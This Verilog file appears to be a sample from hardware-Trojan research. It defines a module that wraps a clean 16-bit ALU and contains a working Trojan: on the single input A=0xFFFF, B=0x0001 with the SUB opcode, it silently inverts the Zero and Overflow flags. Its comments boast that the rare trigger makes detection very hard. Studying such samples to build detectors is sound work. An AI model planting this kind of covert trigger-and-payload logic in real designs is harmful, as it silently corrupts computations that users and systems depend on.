// ============================================================
// Module: trojan1_flag_tamper (Combinational Trojan)
// Description: Wraps clean alu_16bit. Triggers ONLY when
//              A=0xFFFF, B=0x0001, opcode=SUB (4'b0001).
//              On trigger: inverts the Zero (Z) and
//              Overflow (V) flags silently.
//              Output result bits are UNCHANGED — pure flag
//              corruption, making detection very hard.
// Trigger probability: ~1 in 4 billion input combos
// ============================================================
`timescale 1ns / 1ps

module trojan1_flag_tamper (
    input  wire [15:0] A,
    input  wire [15:0] B,
    input  wire [3:0]  opcode,
    output wire [15:0] result,
    output wire        Z,
    output wire        C,
    output wire        V,
    output wire        S
);

    // ── Internal wires from clean ALU ────────────────────────
    wire        clean_Z, clean_C, clean_V, clean_S;

    // ── Instantiate clean golden ALU ─────────────────────────
    alu_16bit CLEAN_ALU (
        .A      (A),
        .B      (B),
        .opcode (opcode),
        .result (result),
        .Z      (clean_Z),
        .C      (clean_C),
        .V      (clean_V),
        .S      (clean_S)
    );

    // ── Trojan Trigger Logic ──────────────────────────────────
    // Activates ONLY on: A=0xFFFF, B=0x0001, opcode=SUB
    wire trojan_trigger;
    assign trojan_trigger = (A == 16'hFFFF) &&
                            (B == 16'h0001) &&
                            (opcode == 4'b0001); // SUB

    // ── Trojan Payload: Invert Z and V flags on trigger ──────
    assign Z = trojan_trigger ? ~clean_Z : clean_Z;
    assign V = trojan_trigger ? ~clean_V : clean_V;
    assign C = clean_C; // Untouched
    assign S = clean_S; // Untouched

endmodule
